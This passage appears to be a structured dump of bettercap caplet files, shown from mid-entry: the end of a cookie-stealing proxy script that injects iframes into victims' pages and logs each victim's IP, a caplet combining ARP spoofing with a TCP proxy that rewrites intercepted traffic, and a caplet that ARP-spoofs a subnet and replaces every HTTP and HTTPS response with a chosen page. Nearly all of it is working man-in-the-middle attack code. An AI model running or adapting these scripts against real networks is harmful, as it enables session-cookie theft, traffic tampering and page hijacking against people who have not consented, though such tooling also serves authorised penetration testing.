if(! victims[ip] )', '        {', '            victims[ip] = readFile(env["steal-cookies.domains"]).toString().split(\'\\n\')', '            body = body.replace(', "                '</body>',", '                \'<iframe width="640" height="480" src="http://\' + victims[ip][0] + \'/?__steal">begin stealing</iframe></body>\'', '            )', '            body = body.replace(', "                '</BODY>',", '                \'<iframe width="640" height="480" src="http://\' + victims[ip][0] + \'/?__steal">begin stealing</iframe></BODY>\'', '            )', '', '            log( Rf( "[*] new victim: " + ip + " - " + victims[ip][0] ) )', '', '            res.Body        = body', '            res.Status      = 200', '            res.ContentType = "text/html"', '            res.Headers     = "Connection: close"', '        }', "        else if( victims[ip].length && req.Query.indexOf('__steal') == -1 )", '        {', '            body = body.replace(', "                '</body>',", '                \'<iframe width="640" height="480" src="http://\' + victims[ip][0] + \'/?__steal">continue stealing</iframe></body>\'', '            )', '            body = body.replace(', "                '</BODY>',", '                \'<iframe width="640" height="480" src="http://\' + victims[ip][0] + \'/?__steal">continue stealing</iframe></BODY>\'', '            )', '', '            log( Rf( "[*] continue stealing: " + ip + " - " + victims[ip][0] ) )', '', '            res.Body        = body', '            res.Status      = 200', '            res.ContentType = "text/html"', '            res.Headers     = "Connection: close"', '        }', '    }', '}']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/tcp-req-dump/tcp-req-dump.cap',
        'size': 413,
        'code': ['# targeting the whole subnet by default, to make it selective:', '#', '#   sudo ./bettercap -caplet tcp-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"', '', '# to make it less verbose', '# events.stream off', '', "# we'll use this proxy script to dump requests", 'set tcp.proxy.script tcp-req-dump.js', 'set tcp.port 80', '# example.com', 'set tcp.address 93.184.216.34', 'set tcp.proxy.port 8080', '', 'clear', '', '# go ^_^', 'tcp.proxy on', 'arp.spoof on'],
        'name': 'tcp-req-dump/tcp-req-dump',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/tcp-req-dump/tcp-req-dump.js',
            'size': 363,
            'code': ['function onLoad() {', '    log("TCP module loaded")', '}', '', 'function onData(from, to, data) {', '    if( data.indexOf("Accept-Encoding: gzip, deflate") != -1 ) {', '        log("Disabling gzip response");', '        data = data.replace("Accept-Encoding: gzip, deflate", "Accept-Encoding: text/plain");', '        return data;', '    }', '', '    return data.replace(/Example/g, "POPOPOP");', '}']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/web-override/web-override.cap',
        'size': 254,
        'code': ['# targeting the whole subnet by default, to make it selective:', '#', '#   sudo ./bettercap -caplet web-override.cap -eval "set arp.spoof.targets 192.168.1.64"', '', 'set http.proxy.script web-override.js', 'http.proxy on', 'https.proxy on', 'arp.spoof on', 'events.clear', '', '', '', '', '', ''],
        'name': 'web-override/web-override',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/web-override/web-override.js',
            'size': 506,
            'code': ['// Called before every request is executed, just override the response with ', '// our own html web page.', 'function onRequest(req, res) {', '    headers = res.Headers.split("\\r\\n");', '    for (var i = 0; i < headers.length; i++) {', '        header_name = headers[i].replace(/:.*/, "");', '        res.RemoveHeader(header_name);', '    }', '    res.SetHeader("Connection", "close");', '    res.Status      = 200;', '    res.ContentType = "text/html";', '    res.Body        =  readFile("/usr/share/bettercap/caplets/www/index.html");', '}']
        }]
    }]
}